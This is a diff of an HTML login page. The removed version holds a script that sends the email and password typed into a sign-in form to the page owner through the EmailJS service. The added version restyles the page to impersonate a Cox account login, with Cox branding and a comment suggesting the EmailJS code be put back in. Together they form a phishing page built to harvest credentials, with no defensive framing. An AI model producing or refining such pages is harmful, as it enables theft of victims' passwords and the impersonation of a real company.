@@ -3,113 +3,138 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Sign In</title>
-<!-- EmailJS SDK -->
-<script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
+<title>Cox Login</title>
+<!-- Font Awesome icons (for icons similar to Cox) -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
+
 <style>
   body {
-    font-family: Arial, sans-serif;
-    background-color: #f5f7fa;
     margin: 0;
-    padding: 0;
-    display: flex;
     height: 100vh;
+    font-family: Arial, sans-serif;
+    display: flex;
     justify-content: center;
     align-items: center;
+    background-image: url('YOUR_CUSTOM_IMAGE_URL'); /* Replace with your image */
+    background-size: cover;
+    background-position: center;
   }
-  .signin-container {
-    background: white;
-    padding: 2rem;
-    border-radius: 8px;
-    box-shadow: 0 2px 8px #ccc;
-    width: 320px;
+
+  .login-box {
+    width: 400px;
+    background: rgba(255, 255, 255, 0.9);
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    text-align: center;
   }
-  .signin-container h2 {
-    margin-bottom: 1rem;
+
+  .logo {
+    margin-bottom: 20px;
+  }
+
+  .logo img {
+    width: 150px;
+  }
+
+  h2 {
+    font-size: 24px;
+    margin-bottom: 10px;
     color: #002b45;
   }
+
+  p {
+    font-size: 14px;
+    margin-bottom: 20px;
+    color: #333;
+  }
+
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+
   label {
-    display: block;
-    margin-bottom: 0.3rem;
+    text-align: left;
     font-weight: bold;
-    font-size: 0.9rem;
+    margin-bottom: 5px;
+    font-size: 14px;
     color: #004263;
   }
-  input[type="email"],
-  input[type="password"] {
-    width: 100%;
-    padding: 0.5rem;
-    margin-bottom: 1rem;
+
+  input[type=email], input[type=password] {
+    padding: 10px;
+    margin-bottom: 15px;
     border: 1px solid #cbd1d8;
     border-radius: 4px;
-    font-size: 1rem;
+    font-size: 14px;
   }
+
   button {
-    width: 100%;
+    padding: 12px;
     background-color: #0078d2;
-    color: white;
-    padding: 0.6rem;
+    color: #fff;
     border: none;
     border-radius: 4px;
-    font-size: 1rem;
+    font-size: 16px;
     cursor: pointer;
   }
+
   button:hover {
     background-color: #005ea3;
   }
-  .message {
-    margin-top: 1rem;
-    font-size: 0.9rem;
-    color: green;
-    text-align: center;
+
+  .forgot {
+    margin-top: 10px;
+    font-size: 13px;
+    text-align: right;
+  }
+
+  .forgot a {
+    color: #0078d2;
+    text-decoration: none;
+  }
+
+  .footer {
+    margin-top: 25px;
+    font-size: 13px;
+  }
+
+  .footer a {
+    color: #0078d2;
+    text-decoration: none;
+    font-weight: bold;
   }
 </style>
 </head>
 <body>
 
-<div class="signin-container">
+<div class="login-box">
+  <div class="logo">
+    <img src="https://via.placeholder.com/150x50?text=Cox" alt="Cox Logo" />
+  </div>
   <h2>Sign In</h2>
-  <form id="signin-form">
-    <label for="user_email">Email</label>
-    <input type="email" id="user_email" name="user_email" required />
+  <p>Sign in to your Cox account to access your services</p>
+  <form>
+    <label for="email">Email or Phone Number</label>
+    <input type="email" id="email" placeholder="Email or Phone Number" required />
 
-    <label for="user_password">Password</label>
-    <input type="password" id="user_password" name="user_password" required />
+    <label for="password">Password</label>
+    <input type="password" id="password" placeholder="Password" required />
 
     <button type="submit">Sign In</button>
+    
+    <div class="forgot">
+      <a href="#">Forgot password?</a>
+    </div>
   </form>
-  <div class="message" id="form-message"></div>
+  
+  <div class="footer">
+    <p>Don't have an account? <a href="#">Register now</a></p>
+  </div>
 </div>
 
-<script>
-  // Initialize EmailJS with your user ID from your EmailJS dashboard
-  (function(){
-    emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
-  })();
-
-  const form = document.getElementById('signin-form');
-  const messageEl = document.getElementById('form-message');
-
-  form.addEventListener('submit', function(event) {
-    event.preventDefault();
-
-    // Prepare template parameters
-    const templateParams = {
-      user_email: form.user_email.value,
-      user_password: form.user_password.value
-    };
-
-    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
-      .then(function(response) {
-        messageEl.textContent = "Sign in info sent successfully!";
-        messageEl.style.color = "green";
-        form.reset();
-      }, function(error) {
-        messageEl.textContent = "Failed to send sign in info. Try again.";
-        messageEl.style.color = "red";
-      });
-  });
-</script>
+<!-- Optional: include your EmailJS code here if needed -->
 
 </body>
 </html>
